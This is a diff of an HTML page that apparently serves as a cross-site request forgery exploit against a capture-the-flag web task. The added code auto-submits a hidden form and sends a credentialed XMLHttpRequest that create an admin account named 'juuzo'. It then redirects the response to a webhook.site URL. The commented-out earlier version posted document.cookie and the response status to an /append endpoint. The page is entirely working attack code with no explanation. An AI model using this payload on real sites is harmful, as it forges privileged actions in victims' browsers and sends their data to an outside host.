@@ -6,40 +6,64 @@
     <title>Document</title>
 </head>
 <body>
+        <form action="https://tasks.goidactf.ru:20125/create_admin" method="POST">
+            <input type="hidden" name="new_admin_login" value="juuzo" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+
+
+    <iframe src="https://tasks.goidactf.ru:20125/admin" sandbox="allow-scripts allow-top-navigation allow-forms" frameborder="0" width="800" height="600">
+<script>
+req = new XMLHttpRequest();
+req.onload = reqListener;
+req.body='new_admin_login=juuzo';
+req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+req.open('post','/create_admin',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+location='https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005='+this.responseText;
+};
+</script>
+
+    </iframe>
 
     <script>
-        fetch('https://tasks.goidactf.ru:20125/create_admin',
-{
-    method:'POST',
-    headers:{
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Origin':'https://tasks.goidactf.ru:20125'
-        },
-    credentials:'include',
-    body:'new_admin_login=juuzo'
-}).then(r=>{
-fetch('/append',{
-    method:'POST',
-    headers:{
-        'Content-Type': 'application/json'
-    },
-    body:JSON.stringify({
-        cookie:document.cookie,
-        headers:Object.fromEntries([...new Headers(document.headers || {})]),
-        ip:'xss',
-        response:r.status
-    })
-})
-}).catch(err => {
-    return fetch("/append", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        ok: false,
-        status: err.status || null,
-        error: err.message
-      })
-    })})
-    </script>
+//         fetch('https://tasks.goidactf.ru:20125/create_admin',
+// {
+//     method:'POST',
+//     headers:{
+//         'Content-Type': 'application/x-www-form-urlencoded',
+//         'Origin':'https://tasks.goidactf.ru:20125'
+//         },
+//     credentials:'include',
+//     body:'new_admin_login=juuzo'
+// }).then(r=>{
+// fetch('/append',{
+//     method:'POST',
+//     headers:{
+//         'Content-Type': 'application/json'
+//     },
+//     body:JSON.stringify({
+//         cookie:document.cookie,
+//         headers:Object.fromEntries([...new Headers(document.headers || {})]),
+//         ip:'xss',
+//         response:r.status
+//     })
+// })
+// }).catch(err => {
+//     return fetch("/append", {
+//       method: "POST",
+//       headers: { "Content-Type": "application/json" },
+//       body: JSON.stringify({
+//         ok: false,
+//         status: err.status || null,
+//         error: err.message
+//       })
+//     })})
+//     </script>
 </body>
 </html>
